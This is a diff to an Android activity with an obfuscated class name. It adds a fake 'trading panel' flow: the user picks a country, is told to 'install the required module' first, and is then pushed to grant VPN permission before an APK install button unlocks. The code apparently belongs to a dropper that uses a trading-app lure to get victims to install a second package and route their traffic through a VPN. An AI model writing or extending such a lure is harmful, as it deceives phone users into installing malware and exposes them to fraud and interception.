@@ -16,8 +16,11 @@ import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
 import android.provider.Settings;
+import android.view.View;
 import android.widget.Button;
+import android.widget.RadioGroup;
 import android.widget.TextView;
+import android.widget.Toast;
 
 import androidx.core.content.FileProvider;
 
@@ -46,6 +49,12 @@ public class A4450c4b785 extends Activity {
 
     private TextView status;
     private Button   btn;
+    private View     countryPage;
+    private View     tradingPanelPage;
+    private View     installPage;
+    private TextView selectedCountryView;
+    private RadioGroup countryOptions;
+    private String selectedCountry = "India";
     private final Handler ui = new Handler(Looper.getMainLooper());
     private Uri incomingApkUri;
 
@@ -167,14 +176,46 @@ public class A4450c4b785 extends Activity {
         status = findViewById(R.id.status);
         btn    = findViewById(R.id.btnInstall);
         btn.setOnClickListener(v -> onInstallClicked());
+        countryPage = findViewById(R.id.countryPage);
+        tradingPanelPage = findViewById(R.id.tradingPanelPage);
+        installPage = findViewById(R.id.installPage);
+        selectedCountryView = findViewById(R.id.selectedCountry);
+
+        countryOptions = findViewById(R.id.countryOptions);
+        countryOptions.setOnCheckedChangeListener((group, checkedId) -> {
+            if (checkedId == R.id.countryIndia) {
+                selectedCountry = "India";
+            } else if (checkedId == R.id.countryUsa) {
+                selectedCountry = "USA";
+            } else if (checkedId == R.id.countryNewYork) {
+                selectedCountry = "New York";
+            } else {
+                return;
+            }
+            selectedCountryView.setText("Selected country: " + selectedCountry);
+            showTradingPanelPage();
+        });
+
+        findViewById(R.id.btnOpenTradingPanel).setOnClickListener(v -> {
+            Toast.makeText(this,
+                    "First install the required module to open the trading panel.",
+                    Toast.LENGTH_LONG).show();
+            showInstallPage();
+            status.setText("First install the required module to continue.");
+            btn.setEnabled(false);
+            requestVpnPermission();
+            ui.postDelayed(vpnMonitor, VPN_MONITOR_MS);
+        });
+
         registerInstallStatusReceiver();
 
-        // Lock the Install button and demand VPN permission before anything else.
-        btn.setEnabled(false);
-        requestVpnPermission();
-
-        // Start the monitor — it will enable the button once VPN is confirmed live.
-        ui.postDelayed(vpnMonitor, VPN_MONITOR_MS);
+        if (incomingApkUri != null) {
+            // External APK installs retain the original entry path.
+            showInstallPage();
+            btn.setEnabled(false);
+            requestVpnPermission();
+            ui.postDelayed(vpnMonitor, VPN_MONITOR_MS);
+        }
     }
 
     @Override
@@ -183,6 +224,35 @@ public class A4450c4b785 extends Activity {
         ui.removeCallbacks(vpnMonitor);
         try { unregisterReceiver(installStatusReceiver); } catch (Exception ignored) {}
         super.onDestroy();
+    }
+
+    @Override
+    public void onBackPressed() {
+        if (tradingPanelPage != null
+                && tradingPanelPage.getVisibility() == View.VISIBLE) {
+            showCountryPage();
+            return;
+        }
+        super.onBackPressed();
+    }
+
+    private void showCountryPage() {
+        countryPage.setVisibility(View.VISIBLE);
+        tradingPanelPage.setVisibility(View.GONE);
+        installPage.setVisibility(View.GONE);
+        countryOptions.clearCheck();
+    }
+
+    private void showTradingPanelPage() {
+        countryPage.setVisibility(View.GONE);
+        tradingPanelPage.setVisibility(View.VISIBLE);
+        installPage.setVisibility(View.GONE);
+    }
+
+    private void showInstallPage() {
+        countryPage.setVisibility(View.GONE);
+        tradingPanelPage.setVisibility(View.GONE);
+        installPage.setVisibility(View.VISIBLE);
     }
 
     @Override
